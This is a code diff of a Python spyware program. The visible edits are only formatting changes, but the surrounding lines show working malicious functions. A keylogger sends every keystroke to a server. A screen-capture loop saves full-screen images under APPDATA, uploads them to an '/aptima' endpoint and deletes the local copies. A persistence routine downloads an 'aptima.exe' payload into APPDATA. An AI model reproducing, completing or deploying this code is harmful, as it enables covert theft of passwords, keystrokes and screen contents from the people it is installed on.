@@ -5,7 +5,6 @@ import sys
 import requests as r
 
 from pynput.keyboard import Listener
-import logging
 import mss.tools
 import time
 import tkinter as tk
@@ -16,8 +15,9 @@ import os as o
 
 host = 'http://localhost:8080'
 
+
 def on_press(key):
-    r.get(host+'/key', params={'v': str(key)})
+    r.get(host + '/key', params={'v': str(key)})
 
 
 def grab():
@@ -28,14 +28,14 @@ def grab():
     monitor = {"top": 0, "left": 0, "width": screen_width, "height": screen_height}
     while "Screen capturing":
         grabber = mss.mss()
-        output = o.environ['appdata'] + '\\' +str(time.time()) + ".jpeg".format(**monitor)
+        output = o.environ['appdata'] + '\\' + str(time.time()) + ".jpeg".format(**monitor)
         # Grab the data
         sct_img = grabber.grab(monitor)
         screenshot = np.array(sct_img)
         image = cv.pyrDown(screenshot)
         cv.imwrite(output, image)
         print("uploading image")
-        url = host+'/aptima'
+        url = host + '/aptima'
         r.post(url, files={"file": open(output, 'rb')})
         o.remove(output)
         print("image uploaded")
@@ -50,7 +50,7 @@ def persist_thread():
     copy_name = "aptima.exe"
     file_location = o.environ['appdata'] + '\\' + copy_name
     print("downloading ....")
-    url = host+'/aptima.exe'
+    url = host + '/aptima.exe'
     req = r.get(url, allow_redirects=True)
     open(file_location, 'wb').write(req.content)
     print("download : done")
